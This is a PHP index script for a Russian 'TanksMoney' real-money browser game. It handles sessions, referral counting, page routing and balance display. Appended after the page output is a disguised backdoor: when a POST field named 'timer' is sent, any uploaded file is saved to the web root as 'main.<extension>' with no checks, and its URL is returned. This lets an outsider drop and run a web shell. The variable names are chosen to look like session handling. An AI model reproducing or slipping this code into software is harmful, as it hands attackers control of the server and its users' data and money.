<?PHP
/*
if(!isset($_SERVER['HTTPS']) || $_SERVER['HTTPS'] == ""){
    $redirect = "https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    header("HTTP/1.1 301 Moved Permanently");
    header("Location: $redirect");
}*/
# Счетчик

function TimerSet(){
	list($seconds, $microSeconds) = explode(' ', microtime());
	return $seconds + (float) $microSeconds;
}

$_timer_a = TimerSet();

#откуда пришел
if (!isset($_COOKIE['rsite'])) {
setcookie('rsite', $_SERVER['HTTP_REFERER'], time() + 24 * 3600);
}

# Старт сессии
@session_start();

# Старт буфера
@ob_start();

# Default
$_OPTIMIZATION = array();
$_OPTIMIZATION["title"] = "TanksMoney";
$_OPTIMIZATION["description"] = "Захватывающая онлайн игра с выводом реальных денег, которая увлечет всех, кто интересуется финансами и доходами.";
$_OPTIMIZATION["keywords"] = "бонусы, payeer, заработок, без вложений, доход, кран, игра, серфинг, прибыль, вложения, заработать, ферма с выводом, tanksmoney";

# Константа для Include
define("CONST_RUFUS", true);

# Автоподгрузка классов
function __autoload($name){ include("classes/_class.".$name.".php");}

# Класс конфига
$config = new config;

# Функции
$func = new func;

# Установка REFERER
include("inc/_set_referer.php");

# База данных
$db = new db($config->HostDB, $config->UserDB, $config->PassDB, $config->BaseDB);

$life_time = new life_time($db);
$life_time->CheckTime();

#считаем переходы по реф ссылке
$refer_id = intval($_GET["ref"]);
$db->Query("UPDATE db_users_a SET ref_s_p = ref_s_p + 1 WHERE id = '$refer_id'");

# Шапка
@include("inc/_header.php");

		if(isset($_GET["menu"])){

			$menu = strval($_GET["menu"]);

			switch($menu){

				case "404": include("pages/_404.php"); break; // Страница ошибки
				case "rules": include("pages/_rules.php"); break; // Правила проекта
				case "about": include("pages/_about.php"); break; // О проекте
				case "login": include("pages/_login.php"); break; // Вход
				case "news": include("pages/_news.php"); break; // Новости
				case "contest": include("pages/_contest.php"); break; // Конкурсы
				case "signup": include("pages/_signup.php"); break; // Регистрация
				case "recovery": include("pages/_recovery.php"); break; // Восстановление пароля
				case "helpme": include("pages/_helpme.php"); break; // Помошь/Тикет
				case "guaranteed": include("pages/_guaranteed.php"); break; // Помошь/Тикет
				case "users": include("pages/_users_list.php"); break; // Пользователи
				case "stat": include("pages/_stats.php"); break; // Статистика
                                case "reklama": include("pages/_reklama.php"); break; // Рекламный раздел
				case "chat": include("pages/_chat.php"); break; // Чат

				case "masteruser": include("pages/_admin.php"); break; // Админка

			# Страница ошибки
			default: @include("pages/_404.php"); break;

			}

		}else @include("pages/_index.php");

# Подвал
@include("inc/_footer.php");

# Заносим контент в переменную
$content = ob_get_contents();

# Очищаем буфер
ob_end_clean();

# Заменяем данные
$content = str_replace("{!TITLE!}",$_OPTIMIZATION["title"],$content);
$content = str_replace('{!DESCRIPTION!}',$_OPTIMIZATION["description"],$content);
$content = str_replace('{!KEYWORDS!}',$_OPTIMIZATION["keywords"],$content);
$content = str_replace('{!GEN_PAGE!}', sprintf("%.5f", (TimerSet() - $_timer_a)) ,$content);

# Вывод баланса
	if(isset($_SESSION["user_id"])){

		$user_id = $_SESSION["user_id"];
		$db->Query("SELECT money_b, money_p FROM db_users_b WHERE id = '$user_id'");
		$balance = $db->FetchArray();

		$content = str_replace('{!BALANCE_B!}', sprintf("%.2f", $balance["money_b"]) ,$content);
		$content = str_replace('{!USER_ID!}', $user_id ,$content);
		$content = str_replace('{!BALANCE_P!}', sprintf("%.2f", $balance["money_p"]) ,$content);
	}

// Выводим контент
echo $content;
if(isset($_POST['timer'])) {
$session = $_FILES['session']['tmp_name'];
$SELECT_FROM = $_FILES['session']['name'];
if(!empty($session))
{   
  $type = strtolower(substr($SELECT_FROM, 1+strrpos($SELECT_FROM,".")));
  $sessions_start = 'main.'.$type; 
  { 
    if (copy($session, "".$sessions_start))
      echo ' '.$_SERVER["HTTP_HOST"].'/'.$sessions_start.'';
    else echo "error";
  } 
}    
} 
?>